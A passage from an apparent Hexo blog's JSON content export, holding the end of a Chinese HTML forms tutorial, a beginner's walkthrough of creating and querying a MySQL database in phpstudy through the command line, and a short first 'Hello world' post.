值为数字也可使用disabled name readonly属性实例自我介绍：&lt;textarea cols=\"20\" rows=\"10\"&gt;&lt;/textarea&gt; 4、label标签：提升用户体验标签for属性与input的id属性相同 5、select标签：配合option实现下拉菜单可用属性：disabled name multiple&lt;select&gt;​ &lt;option&gt;&lt;/option&gt;&lt;/select&gt; 6、option标签可用属性：disabled select value 7、optgroup标签&lt;!--把相关选项组合在一起--&gt; 属性label：给选项组命名属性disabled：停用该选项组实例 &lt;select&gt; &lt;optgroup label=\"河南省\"&gt; ​ &lt;option value=\"周口\"&gt;周口&lt;/option&gt; &lt;option&gt;郑州&lt;/option&gt; &lt;option&gt;洛阳&lt;/option&gt; &lt;/optgroup&gt; &lt;/select&gt; 表单提交实例2&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;link rel=\"icon\" href=\"../../favicon.ico\"&gt; &lt;title&gt;表单提交练习&lt;/title&gt; &lt;link href=\"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"../../assets/css/ie10-viewport-bug-workaround.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"signin.css\" rel=\"stylesheet\" /&gt; &lt;script src=\"../../assets/js/ie-emulation-modes-warning.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"container\"&gt; &lt;form class=\"form-signin\" name=\"submit\" target=\"_blank\" method=\"get\"&gt; &lt;h2 class=\"form-signin-heading\"&gt;表单提交&lt;/h2&gt; &lt;input type=\"text\" id=\"inputText\" class=\"form-control\" placeholder=\"text\" /&gt; &lt;br /&gt; &lt;input type=\"password\" id=\"inputPassword\" class=\"form-control\" placeholder=\"Password\" /&gt; &lt;br /&gt; &lt;input class=\"btn btn-lg btn-primary btn-block\" type=\"submit\" value=\"立即提交\" /&gt; &lt;/form&gt; &lt;/div&gt; &lt;script src=\"../../assets/js/ie10-viewport-bug-workaround.js\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"前端","slug":"前端","permalink":"https://qwzf.gitee.io/blog/tags/前端/"}],"author":"qwzf"},{"title":"phpstudy-MySQL的简单使用以及cmd打开MySQL","slug":"phpstudy-MySQL基础篇一","date":"2019-03-15T15:39:20.232Z","updated":"2019-08-01T05:16:36.727Z","comments":true,"path":"2019/03/15/phpstudy-MySQL基础篇一/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/03/15/phpstudy-MySQL基础篇一/","excerpt":"","text":"今天尝试学习使用phpstudy中的mysql，让我受益颇深。所以把学习和练习过程记录了一下，首先是数据库的创建，其次是在MySQL命令行对数据增、删、改、查的练习，最后是用cmd打开phpstudy中的MySQL，以及增删改查练习。要注意的是，phpstudy中默认账户密码都是root，只在文件中把密码改了是没有用的。在此之前，我们需要了解一下什么是数据库和mysql。数据库就是存储数据的仓库，其本质是一个文件系统，数据按照特定的格式将数据存储起来，用户可以对数据库中的数据进行增加，修改，删除及查询操作。mysql是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，提高了灵活性。使用的语言是SQL语言。 1、创建数据库（1）打开MySQL-Front发现这里自带前端可视化界面。然后我开始对数据库进行创建。 （2）创建、删除数据库首先，创建一个数据库名为mydata的数据库（或者是在MySQL命令行中输入create database 数据库名称；）mysql&gt; create database mydata;Query OK, 1 row affected (0.01 sec) 如果删除该数据库，在这里可进行删除（或者是在MySQL命令行中输入drop database 数据库名称；）mysql&gt; drop database mydata;Query OK, 0 rows affected (0.00 sec) （3）创建、删除数据表创建一个数据表名为users的数据表格（或者是在MySQL命令行中输入create table 表名 ( id int ,name varchar(35),password varchar(40)); 其中 id name password 是字段 ,后面的限制是类型。）mysql&gt; use mydata;Database changedmysql&gt; create table users(Id int,text varchar(35),password varchar(40));Query OK, 0 rows affected (0.01 sec) 如果删除该数据表，在这里可进行删除（或者是在MySQL命令行中输入drop table 表名；）mysql&gt; drop table users;Query OK, 0 rows affected (0.00 sec) 然后类似的，再进行字段的创建。创建好之后，由对象浏览器转换到数据浏览器，输入相关数据就完整创建了一个数据库。如下： 2、通过MySQL命令行对数据增、删、改、查首先，打开MySQL命令行，输入默认密码root （1）选择数据库选择使用哪个数据库，这里选择使用的是mydata数据库mysql&gt; use mydata;Database changed （2）数据的增、删、改、查1.增原先，没有“id=6，text=‘qwzf’，password=‘qwzf’”这条记录，通过sql语句在数据库的表格中添加了这条记录。（或者是alter table 表名 add 字段名称+字段类型；） 2.删mysql&gt; delete from users where id=5;Query OK, 1 row affected (0.00 sec) 这里删除了在表格users中id=5的那条记录。（或者是alter table 表名 drop 字段名字；） 3.改如果要改表名，则在MySQL命令行输入alter table 原表名 rename 新的名字；如果要修改字段，则在MySQL命令行输入alter table 表名 change 原来的字段名称 修改后的字段名称；（或者是update 表名 set 字段=‘数据’ where 范围;）在id=4的那条记录中，字段text下的数据“php”被更新修改成“him” 4.查1.查库在命令行想看所有的数据库，这就用到了show databases；（注意：在mysql语句中，一句话写完必须加分号。且mysql语句中不区分大小写）mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mydata || myl || myphp || myphp2 || mysql || performance_schema || test |+--------------------+8 rows in set (0.01 sec) 2.查表在命令行想看mydata数据库中所有表，这就用到了show tables；mysql&gt; show tables; +------------------+ | Tables_in_mydata | +------------------+ | users | +------------------+ 1 row in set (0.00 sec) 在命令行想看users表中所有数据，这就用到了select*from 表名；mysql&gt; select*from users;+----+-------+----------+| Id | text | password |+----+-------+----------+| 1 | admin | admin || 2 | root | root || 3 | wang | wang || 4 | him | php || 6 | qwzf | qwzf |+----+-------+----------+5 rows in set (0.00 sec) 3.查字段在命令行想看users表中在一定范围的字段,select*from 表名 where 范围；mysql&gt; select*from users where id=1;+----+-------+----------+| Id | text | password |+----+-------+----------+| 1 | admin | admin |+----+-------+----------+1 row in set (0.00 sec)mysql&gt; select*from users where text='qwzf';+----+------+----------+| Id | text | password |+----+------+----------+| 6 | qwzf | qwzf |+----+------+----------+1 row in set (0.00 sec)mysql&gt; select*from users where password='wang';+----+------+----------+| Id | text | password |+----+------+----------+| 3 | wang | wang |+----+------+----------+1 row in set (0.00 sec) 4.查看表结构在命令行想看users表的表结构，用desc 表名；mysql&gt; desc users;+----------+--------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+--------------+------+-----+---------+----------------+| Id | int(11) | NO | PRI | NULL | auto_increment || text | varchar(255) | YES | | NULL | || password | varchar(255) | YES | | NULL | |+----------+--------------+------+-----+---------+----------------+3 rows in set (0.00 sec) 3、用cmd打开phpstudy中的MySQL首先，打开cmd命令行页面。如果计算机是Windows10操作系统，输入Windows+R，打开windows运行搜索框，输入cmd回车，打开cmd命令行页面。然后在电脑上找到phpstudy所在目录。1.返回上一级目录cd\\ 2.进入下一级目录cd+空格+目录名下面是我在cmd命令行中打开phpstudy中MySQL的过程：C:\\Users\\ASUS&gt;cd\\ // 返回上一级目录C:\\&gt;cd phpstudy //进入下一级目录C:\\phpStudy&gt;cd PHPTutorialC:\\phpStudy\\PHPTutorial&gt;cd MySQLC:\\phpStudy\\PHPTutorial\\MySQL&gt;cd binC:\\phpStudy\\PHPTutorial\\MySQL\\bin&gt;mysql -u root -pEnter password: ****Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 4Server version: 5.5.53 MySQL Community Server (GPL)Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; 用cmd打开mysql后，增、删、改、查过程与直接在phpstudy通过MySQL命令行对数据增、删、改、查，过程相同。可参照上面的直接通过MySQL命令行对数据增、删、改、查过程。本人小白一枚，如有个别错误，敬请大佬指正。","categories":[{"name":"Databases","slug":"Databases","permalink":"https://qwzf.gitee.io/blog/categories/Databases/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"数据库","slug":"数据库","permalink":"https://qwzf.gitee.io/blog/tags/数据库/"},{"name":"phpstudy","slug":"phpstudy","permalink":"https://qwzf.gitee.io/blog/tags/phpstudy/"}],"author":"qwzf"},{"title":"Hello world","slug":"hello-world","date":"2019-03-12T14:33:11.959Z","updated":"2019-08-01T05:51:54.249Z","comments":true,"path":"2019/03/12/hello-world/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/03/12/hello-world/","excerpt":"","text":"第一篇第一次搭这个，忙了许久，总算搭好了。在搭的过程中，竟然没有踩坑，真好。 于是我便迫不及待的先写下这个 blog试试怎么样。 现在看起来效果还不错，希望我能再接再厉，写出好的blog。总感觉blog有些单调，于是我便把我在CSDN写的blog，导出成Markdown文件，并且放在自己搭建的github-hexo个人博客主页上，充实一下自己的blog。开始我的小白进阶之旅！！！","categories":[{"name":"First","slug":"First","permalink":"https://qwzf.gitee.io/blog/categories/First/"}],"tags":[],"author":"qwzf"}]}